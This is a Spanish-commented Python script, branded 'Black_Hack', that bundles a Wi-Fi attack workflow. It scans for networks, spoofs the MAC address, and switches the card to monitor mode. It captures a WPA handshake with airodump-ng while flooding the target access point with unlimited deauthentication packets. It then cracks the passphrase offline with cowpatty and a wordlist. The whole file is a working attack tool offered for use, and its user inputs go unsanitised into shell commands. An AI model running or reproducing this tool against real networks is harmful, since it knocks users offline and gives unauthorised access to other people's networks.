#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import os, time, threading
from io import open
## Crador Smp_A
# Fecha 25.7.2020
# Licencia Open soft GNU
# Nombre programa Rambo WiFi telefono
# Tipo Script shell
# Hack pin wps Wifi basado en craking rainbow
# lenguaje Python3 
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet        Smp_A')
print("		 Black_Hack")                 	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["Opciones:","1) Scaner red ", "2) Capture", "3) Crack", "4) Exit"]#Menu Princcipal
key=0
exit=False
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def scan():
	global essid
	global bssid
	global canal
	global diccionario
	time_scan=input("Seleccione tiempo de escaneo default 60 : ")
	if(time_scan==''):
		time_scan="60"
	os.system('nmcli -w '+time_scan+' device wifi list')
	essid=input("seleccione SSID : ")
	bssid=input("seleccione BSSID : ")
	canal=input("seleccione CHANEL : ")
	diccionario=input("Introduzca ruta diccionario .lts:")
	return essid,canal,bssid, diccionario

def attack(bssid,canal):
	os.system("ifconfig")
	wlan=input("Introduzca Wlan: ")
	if(wlan=="wlan0mon" or wlan== "wlan1mon"):
		wlan=wlan
	else:
		print("Procesando")
		os.system('ifconfig '+wlan+' down')
		time.sleep(1)
		os.system('macchanger -A '+wlan)
		time.sleep(1)
		os.system('ifconfig '+wlan+' up') 
		time.sleep(1)
		os.system('airmon-ng check kill')
		time.sleep(1)
		os.system('airmon-ng start '+wlan)
		time.sleep(1)
		os.system('airmon-ng check '+wlan)
		time.sleep(1)
		wlan=(wlan+"mon")
	print(wlan)
	os.system('x-terminal-emulator -e airodump-ng --bssid '+bssid+' -c '+canal+' -w cowpatty '+wlan)
	os.system('x-terminal-emulator -e aireplay-ng -0 0 -a'+bssid+' '+wlan+' --ignore-negative-one')


def crack(essid,diccionario):
	os.system('x-terminal-emulator -e cowpatty -f '+diccionario+' -r /root/Especial_termux_kali/cowpatty-01.cap -s '+essid)
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		scan()
	elif (key==2):
		attack(bssid,canal)
	elif (key==3):
		crack(essid,diccionario)
	elif (key==4):
		os.system('airmon-ng stop wlan0mon')
		os.system('ifconfig wlan0 down')
		os.system('iwconfig wlan0 mode managed')
		os.system('ifconfig wlan0 up')
		os.system('service network-manager start')
		exit=True
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
